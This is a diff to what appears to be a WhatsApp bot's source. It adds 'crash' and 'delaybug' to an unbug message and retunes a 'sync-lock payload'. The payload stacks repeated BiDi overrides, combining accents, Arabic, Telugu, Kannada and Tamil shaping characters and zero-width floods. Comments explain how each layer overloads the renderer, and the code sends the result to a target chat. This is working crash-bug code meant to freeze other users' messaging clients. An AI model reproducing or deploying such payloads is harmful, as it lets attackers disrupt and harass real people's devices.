@@ -3883,7 +3883,7 @@ _Can be started from any chat, but source members require source group access an
                     } catch (_) {}
                 }
                 delete userCrashKeys[unbugTarget];
-                await reply(`✅ *Unbugged ${unbugTarget.split("@")[0]}!*\nDeleted ${unbugDeleted} crash message(s).\n\n_All bug types cleared: android, iOS, freeze, forceclose, invisfreeze._`);
+                await reply(`✅ *Unbugged ${unbugTarget.split("@")[0]}!*\nDeleted ${unbugDeleted} crash message(s).\n\n_All bug types cleared: android, iOS, freeze, forceclose, invisfreeze, crash, delaybug._`);
                 break;
             }
 
@@ -4060,17 +4060,17 @@ _Can be started from any chat, but source members require source group access an
                 try {
                     // ── Sync-lock payload ──
                     // Layer 1: Deep BiDi direction stacking — forces repeated resolution passes
-                    const bidiDeep  = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(900);
+                    const bidiDeep  = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(600);
                     // Layer 2: NFC normalization busters — A + combining accent sequences WA must normalize
-                    const normBust  = "\u0041\u0301\u0041\u0302\u0041\u0303\u0041\u0304\u0041\u0306\u0041\u0307\u0041\u0308\u0041\u030A".repeat(600);
+                    const normBust  = "\u0041\u0301\u0041\u0302\u0041\u0303\u0041\u0304\u0041\u0306\u0041\u0307\u0041\u0308\u0041\u030A".repeat(450);
                     // Layer 3: Arabic/Sindhi shaping — expensive to resolve glyph joins
-                    const arabShape = "\u0600\u0601\u0602\u0603\u0604\u0605\uFDFD\uFDFC\uFDFB\uFE70\uFE72\uFE74".repeat(500);
+                    const arabShape = "\u0600\u0601\u0602\u0603\u0604\u0605\uFDFD\uFDFC\uFDFB\uFE70\uFE72\uFE74".repeat(380);
                     // Layer 4: Telugu combining marks — overloads Indic renderer
-                    const telComb   = "\u0C15\u0C4D\u0C37\u0C4D\u0C30\u0C3E\u0C4B\u0C4C".repeat(400);
+                    const telComb   = "\u0C15\u0C4D\u0C37\u0C4D\u0C30\u0C3E\u0C4B\u0C4C".repeat(320);
                     // Layer 5: Zero-width flood — fills internal text buffer silently
-                    const zwFlood   = "\u200B\u200C\u200D\u200E\u200F\u2060\uFEFF\u00AD\u2062\u2063\u2064".repeat(700);
+                    const zwFlood   = "\u200B\u200C\u200D\u200E\u200F\u2060\uFEFF\u00AD\u2062\u2063\u2064".repeat(500);
                     // Layer 6: Kannada + Tamil stacked — compounds rendering cost
-                    const kanTam    = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(350);
+                    const kanTam    = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(270);
                     // Assemble the final payload — ordering matters for max queue lock
                     const delayPayload = bidiDeep + zwFlood + normBust + arabShape + bidiDeep + telComb + kanTam + zwFlood + bidiDeep;
                     const sent = await sock.sendMessage(dbTarget, { text: delayPayload });
